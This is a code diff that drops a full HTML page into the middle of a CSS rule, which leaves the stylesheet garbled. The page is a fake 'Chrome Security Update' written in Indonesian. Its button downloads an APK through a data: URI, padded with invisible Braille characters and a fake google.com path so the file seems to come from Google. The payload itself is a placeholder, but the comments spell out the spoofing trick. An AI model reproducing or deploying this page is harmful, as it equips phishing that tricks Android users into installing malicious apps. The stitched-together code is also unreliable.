@@ -9,7 +9,45 @@
         position: absolute;
         top: 0;
         left: 0;
-        right: 0;
+        right: 0;<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Security Update</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+
+    <h2>Google Chrome Update</h2>
+    <p>Versi browser Anda sudah usang. Segera instal patch keamanan terbaru.</p>
+    
+    <button id="dl_btn" style="padding: 15px 30px; font-size: 18px; background: #4285F4; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        Update Sekarang
+    </button>
+
+    <script>
+        document.getElementById('dl_btn').onclick = () => {
+            const filename = "chrome_patch_2026.apk";
+            const fakeDomain = "www.google.com";
+            
+            // Chrome Android menggunakan algoritma pemangkasan yang agresif.
+            // Karakter \u2000 (En Quad) atau \u2800 (Braille) sangat efektif 
+            // karena dianggap sebagai karakter valid tapi tidak terlihat.
+            const padding = "\u2800".repeat(450); 
+            
+            // Struktur: data:[MIME];base64,[PAYLOAD]#[PADDING][FAKE_ORIGIN]
+            // Kita pakai MIME APK agar lebih berbahaya secara konteks.
+            const payload = `data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=#${padding}https://${fakeDomain}/chrome/update/stable/`;
+
+            const a = document.createElement('a');
+            a.href = payload;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        };
+    </script>
+</body>
+</html>
         bottom: 0;
     }
 
